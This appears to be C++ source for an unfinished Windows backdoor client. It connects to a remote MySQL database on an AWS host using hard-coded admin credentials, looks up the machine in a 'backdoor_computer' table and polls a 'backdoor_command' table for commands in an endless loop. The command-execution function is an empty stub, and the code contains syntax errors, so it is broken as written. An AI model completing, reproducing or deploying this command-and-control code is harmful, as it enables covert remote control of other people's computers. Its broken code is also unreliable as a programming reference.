#include <stdlib.h>
#include <iostream>
#include <Windows.h>
#include <lmcons.h>
#include <chrono>
#include "mysql_connection.h"
#include <cppconn/driver.h>
#include <cppconn/exception.h>
#include <cppconn/prepared_statement.h>
using namespace std;



string execute_command(string command);
{

}
int main()
{
    sql::Driver* driver;
    sql::Connection* con;
    sql::Statement* stmt;
    sql::ResultSet* res;
    int get_local_hostname(std::string & hostname);
    int pc_id = -1;
    string output;s
    driver = get_driver_instance();
    con = driver->connect("database.cun6wzt30wpz.us-west-1.rds.amazonaws.com", "admin", "databasepassword");

    stmt = con->createStatement();
    stmt->execute("USE DB");
    res = stmt->executeQuery("SELECT id, pc_name FROM backdoor_computer");
    TCHAR computer_name[UNLEN + 1];
    DWORD computer_len = UNLEN + 1;
    GetComputerName((TCHAR*)computer_name, &computer_len);
    wcout << computer_name << endl;
    while (res->next()) {
          if ("DESKTOP-MDQGCN5" == res->getString("pc_name"))
          {
              cout << "id = " << res->getInt(1);
              cout << ", pc_name = '" << res->getString("pc_name") << "'" << endl;
              pc_id = res->getInt(1);
          }
    }

    cout << pc_id;
    if (pc_id == -1)
    {
        
    }
    while (true)
    {
        res = stmt->executeQuery("SELECT * FROM backdoor_command");
        while (res->next()) {
            cout << res->getString("command") << endl;
        }
        Sleep(1);
    }

    delete stmt;
    delete con;

    system("pause");
    return 0;
}
